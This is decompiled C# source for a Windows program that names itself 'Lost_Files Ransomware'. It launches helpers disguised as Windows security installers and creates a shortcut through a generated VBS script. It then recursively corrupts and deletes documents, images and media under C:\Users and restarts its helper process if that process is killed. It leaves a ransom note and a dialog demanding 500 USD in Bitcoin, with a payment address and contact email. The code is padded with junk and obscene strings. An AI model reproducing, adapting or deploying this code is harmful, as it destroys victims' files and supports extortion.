using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Lost_Files;

public class Form1 : Form
{
	private string Donk1 = "23323223";

	private string Donk2 = "23323223";

	private string Donk3 = "23323223";

	private string Donk4 = "23323223";

	private string User_Name = Environment.UserName;

	private string Computer_Name = Environment.MachineName.ToString();

	private string User_Dir = "C:\\Users\\";

	private string Lost_Files_Temp_Name = "Windows Security Installer";

	private string Installer_exe_Temp_Name = "Installer_exe";

	private string SecurityUpdater_Temp_Name = "SecurityUpdater.exe";

	private string BitRun_Temp_Name = "32BitRun";

	private string Folder_Temp_Name = "Test_Folder";

	private IContainer components;

	private Label label1;

	private Button button1;

	private RichTextBox richTextBox1;

	public Form1()
	{
		InitializeComponent();
		string text = "1";
		string text2 = "5";
		string text3 = "2";
		for (int i = 0; i <= 5; i++)
		{
			text += text2;
			text2 += text3;
			text += (text += text3);
		}
		string execution_Folder_Path = Get_Execution_Folder_Path();
		Process.Start(execution_Folder_Path + "\\Resources\\" + Installer_exe_Temp_Name + ".exe");
		string path = execution_Folder_Path + "\\Resources\\Temp_Test.tester";
		string text4 = "1";
		string text5 = "5";
		string text6 = "2";
		for (int j = 0; j <= 5; j++)
		{
			text4 += text5;
			text2 += text6;
			text4 += (text4 += text3);
		}
		string[] array;
		while (true)
		{
			if (File.Exists(path))
			{
				try
				{
					string text7 = "CyberSecurityIsABitch";
					string text8 = "adsasdasdasdsad";
					string.Concat(text7 + text8, text7, text8);
					array = File.ReadAllLines(path);
				}
				catch (Exception)
				{
					string text9 = "CyberSecurityIsABitch";
					string text10 = "adsasdasdasdsad";
					string.Concat(text9 + text10, text9, text10);
					continue;
				}
				break;
			}
		}
		Thread.Sleep(1000);
		string text11 = null;
		if (array[0] == "It's Good.")
		{
			string execution_Folder_Path2 = Get_Execution_Folder_Path();
			if (execution_Folder_Path2 != User_Dir + User_Name + "\\Documents\\" + Folder_Temp_Name)
			{
				string[] array2 = new string[11];
				array2[0] += "Set objShell = WScript.CreateObject(\"WScript.Shell\")";
				ref string reference = ref array2[1];
				reference = reference + "Set lnk = objShell.CreateShortcut(\"" + execution_Folder_Path + "\\Resources\\Windows.LNK\")";
				ref string reference2 = ref array2[2];
				reference2 = reference2 + "lnk.TargetPath = \"" + User_Dir + User_Name + "\\Documents\\" + Folder_Temp_Name + "\\" + Lost_Files_Temp_Name + ".exe\"";
				array2[3] += "lnk.Arguments = \"\"";
				ref string reference3 = ref array2[4];
				reference3 = reference3 + "lnk.Description = \"" + Lost_Files_Temp_Name + "\"";
				array2[5] += "lnk.HotKey = \"ALT+CTRL+F\"";
				array2[6] += "lnk.WindowStyle = \"1\"";
				reference2 = ref array2[7];
				reference2 = reference2 + "lnk.WorkingDirectory = \"" + User_Dir + User_Name + "\\Documents\\" + Folder_Temp_Name + "\\" + Lost_Files_Temp_Name + ".exe\"";
				array2[8] += "lnk.Save";
				array2[9] += "'Clean up";
				array2[10] += "Set ink = Nothing";
				text11 = execution_Folder_Path + "\\Resources\\\\ShortCutVBS.vbs";
				File.WriteAllLines(text11, array2);
				Process.Start(text11);
				Process.Start(execution_Folder_Path2 + "\\Resources\\" + BitRun_Temp_Name + ".exe");
			}
			for (int k = 0; k <= 10; k++)
			{
				if (k == 0)
				{
					try
					{
					}
					catch (Exception)
					{
						continue;
					}
				}
				if (k == 2)
				{
				}
				if (k == 9)
				{
					string text12 = "These pieces of shit needs to get something better to do!";
					_ = "Fuck Cyber Security" + text12;
				}
			}
			string text13 = "\\Desktop\\Ransomware Lost Files Message.txt";
			if (File.Exists(User_Dir + User_Name + text13))
			{
				return;
			}
			Thread thread = new Thread(The_Process);
			thread.Start();
			Thread thread2 = new Thread(Evade_Process_Closure);
			thread2.Start();
			Delete_Directory(User_Dir);
			if (File.Exists(text11))
			{
				File.Delete(text11);
			}
			thread.Abort();
			thread2.Abort();
			Process[] array3 = null;
			try
			{
				array3 = Process.GetProcessesByName(SecurityUpdater_Temp_Name);
				if (array3.Length != 0)
				{
					Process process = array3[0];
					if (!process.HasExited)
					{
						process.Kill();
					}
				}
			}
			finally
			{
				if (array3 != null)
				{
					Process[] array4 = array3;
					for (int l = 0; l < array4.Length; l++)
					{
						array4[l].Dispose();
					}
				}
			}
			Message_Creator();
		}
		else
		{
			Environment.Exit(1);
		}
	}

	public void Delete_Directory(string Directory_Path)
	{
		_ = new string[40]
		{
			".sfd", ".sfs", ".sdfsfdsdf", ".sdfsdf", ".3243", ".43", ".777", ".888", ".3rr", ".3ew",
			".3e3", ".e3tt", ".rtrt4", ".rft4", ".rt4", ".trdf", ".dfdxx", ".xxx", ".porn", ".fuck",
			".dick", ".sex", ".cum", ".glue", ".jizz", ".rag", ".poverty", ".is", ".what", ".caused",
			".the", ".creation", ".cyber", ".security", ".have", ".mercy", ".on", ".on", ".my", ".soul"
		};
		_ = new string[40]
		{
			".I'm", ".From", ".Eastern", ".Europe", ".You", ".Will", ".Never", ".Catch", ".Me", ".Because",
			".I'm", ".Too", ".Good", ".I'm", ".Starving", ".I'm", ".Begging", ".The", ".Gods", ".For",
			".This", ".Ransomware", ".To", ".Work", ".I", ".Want", ".To", ".Get", ".Out", ".Of",
			".Poverty", ".You", ".Can't", ".Be", ".Happy", ".And", ".Poor", ".It's", ".Not", ".HowItworks"
		};
		_ = new string[40]
		{
			".dsfd", ".dsf", ".sdf", ".we", ".rew", ".rew", ".tr", ".rt", ".jhj", ".hjjh",
			".khkh", ".hhh", ".hkh", ".hkh", ".hkhj", ".hkh", ".hjk", ".hkh", ".hk", ".hhk",
			".hkh", ".hkh", ".qeq", ".qweq", ".erer", ".erd", ".dffet", ".dff", ".qq", ".ww",
			".eee", ".23", ".dds", ".sdds", ".dfhd", ".dffd", ".gfgfg", ".dfdf", ".dd", ".qwdg"
		};
		string[] source = new string[80]
		{
			".txt", ".doc", ".docx", ".xls", ".index", ".pdf", ".zip", ".rar", ".css", ".xlsx",
			".ppt", ".pptx", ".odt", ".jpg", ".bmp", ".png", ".csv", ".sql", ".mdb", ".sln",
			".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".bk", ".bat", ".mp3", ".mp4",
			".wav", ".wma", ".avi", ".divx", ".mkv", ".mpeg", ".wmv", ".mov", ".jpeg", ".ogg",
			".TXT", ".DOC", ".DOCX", ".XLS", ".INDEX", ".PDF", ".ZIP", ".RAR", ".CSS", ".XLSX",
			".PPT", ".PPTX", ".ODT", ".JPG", ".BMP", "-PNG", ".CSV", ".SQL", ".MDB", ".SLN",
			".PHP", ".ASP", ".ASPX", ".HTML", ".XML", ".PSD", ".BK", ".BAT", ".MP3", ".MP4",
			".WAV", ".WMA", ".AVI", ".DIVX", ".MKV", ".MPEG", ".WMV", ".MOV", ".OGG", ".JPEG"
		};
		_ = new string[40]
		{
			".dsfd", ".dsf", ".sdf", ".we", ".rew", ".rew", ".tr", ".rt", ".jhj", ".hjjh",
			".khkh", ".hhh", ".hkh", ".hkh", ".hkhj", ".hkh", ".hjk", ".hkh", ".hk", ".hhk",
			".hkh", ".hkh", ".qeq", ".qweq", ".erer", ".erd", ".dffet", ".dff", ".qq", ".ww",
			".eee", ".23", ".dds", ".sdds", ".dfhd", ".dffd", ".gfgfg", ".dfdf", ".dd", ".qwdg"
		};
		_ = new string[40]
		{
			".sfd", ".sfs", ".sdfsfdsdf", ".sdfsdf", ".3243", ".43", ".777", ".888", ".3rr", ".3ew",
			".3e3", ".e3tt", ".rtrt4", ".rft4", ".rt4", ".trdf", ".dfdxx", ".xxx", ".porn", ".fuck",
			".dick", ".sex", ".cum", ".glue", ".jizz", ".rag", ".poverty", ".is", ".what", ".caused",
			".the", ".creation", ".cyber", ".security", ".have", ".mercy", ".on", ".on", ".my", ".soul"
		};
		_ = new string[40]
		{
			".I'm", ".From", ".Eastern", ".Europe", ".You", ".Will", ".Never", ".Catch", ".Me", ".Because",
			".I'm", ".Too", ".Good", ".I'm", ".Starving", ".I'm", ".Begging", ".The", ".Gods", ".For",
			".This", ".Ransomware", ".To", ".Work", ".I", ".Want", ".To", ".Get", ".Out", ".Of",
			".Poverty", ".You", ".Can't", ".Be", ".Happy", ".And", ".Poor", ".It's", ".Not", ".HowItworks"
		};
		string[] files = Directory.GetFiles(Directory_Path);
		string[] directories = Directory.GetDirectories(Directory_Path);
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					Delete_A_Few_Chars(files[i]);
				}
			}
			catch (SystemException)
			{
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			_ = new string[5] { "Kim", "Kardashian", "The", "Cum", "Dumpster" };
			_ = new string[4] { "Fuck", "My", "Life", "Bitch" };
			try
			{
				for (int k = 0; k <= 3; k++)
				{
				}
				Delete_Directory(directories[j]);
			}
			catch (SystemException)
			{
				for (int l = 0; l <= 3; l++)
				{
				}
			}
		}
	}

	public void Delete_A_Few_Chars(string Directory_Path)
	{
		string[] array;
		try
		{
			for (int i = 0; i <= 3; i++)
			{
			}
			array = File.ReadAllLines(Directory_Path);
			for (int j = 0; j <= 5; j++)
			{
			}
		}
		catch (Exception)
		{
			return;
		}
		string? path = Path.ChangeExtension(Directory_Path, ".Lost_Files_Encrypt");
		array[0] = null;
		Path.ChangeExtension(Directory_Path, ".Black_Pussy");
		Path.ChangeExtension(Directory_Path, ".White_Pussy");
		Path.ChangeExtension(Directory_Path, ".Asian_Pussy");
		File.WriteAllLines(path, array);
		Path.ChangeExtension(Directory_Path, ".Black_Dick");
		Path.ChangeExtension(Directory_Path, ".White_Dick");
		Path.ChangeExtension(Directory_Path, ".Asian_Dick");
		File.Delete(Directory_Path);
	}

	public void Message_Creator()
	{
		string text = "\\Desktop\\Ransomware Lost Files Message.txt";
		string path = User_Dir + User_Name + text;
		string[] contents = new string[1] { "Hi, This is Lost_Files Ransomware, Pay us 500 USD to get our decryption software. So that you can get your files back. The payment is going to be paid in Bitcoin(BTC). For more information about this please click the same EXE file you clicked when you lost all your files. There will be detailed instruction there." };
		try
		{
			File.WriteAllLines(path, contents);
		}
		catch (Exception)
		{
		}
	}

	public string Get_Execution_Folder_Path()
	{
		try
		{
		}
		catch (Exception)
		{
		}
		return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("The email is: Lost_Files_Ransom@secmail.pro\nTransfer BTC to this address: 13nRGetwvc7UZF8P5KM9bWqHGK6tMk7wyf");
	}

	public static void The_Process()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new Form2()).ShowDialog();
		Thread.Sleep(0);
	}

	public void Evade_Process_Closure()
	{
		string execution_Folder_Path = Get_Execution_Folder_Path();
		while (true)
		{
			if (Process.GetProcessesByName(SecurityUpdater_Temp_Name).Length == 0)
			{
				Process.Start(execution_Folder_Path + "\\Resources\\" + SecurityUpdater_Temp_Name + ".exe");
				while (Process.GetProcessesByName(SecurityUpdater_Temp_Name)[0].Id == 0)
				{
				}
				_ = new string[8] { "dsffdsdsfdsf", "sdfsdf", "dsfsdf", "fsdfds", "sdfdsfsf", "sdfdsfdsf", "sfdsf", "sdfsdfsf" };
				_ = new string[8] { "34534543534", "345345", "ert34t34", "34535", "rt343t", "34t3ret3", "sfdsertertf", "et33t4t4" };
				_ = new string[8] { "ret3", "34tt43t", "3t34t34t", "33t4t4", "43t43t", "34t34t43t", "34t43t43t", "sdfsdt3t3fsf" };
				_ = new string[8] { "ertretert", "etertert", "d34t34tsfsdf", "ertrete", "sdfd4343t3sfsf", "ertertert", "sft35tdsf", "erterter" };
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_0164: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Expected O, but got Unknown
		//IL_025d: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		button1 = new Button();
		richTextBox1 = new RichTextBox();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 17.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(50, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(526, 29));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("ATTENTION!!! Your Data Has Been Encrypted!!!");
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(12, 299));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(610, 51));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Get Your Data Decrypted");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)richTextBox1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(13, 41));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(609, 252));
		((Control)richTextBox1).set_TabIndex(2);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		((Control)richTextBox1).add_TextChanged((EventHandler)richTextBox1_TextChanged);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(634, 362));
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Margin(new Padding(2));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("Lost Files");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
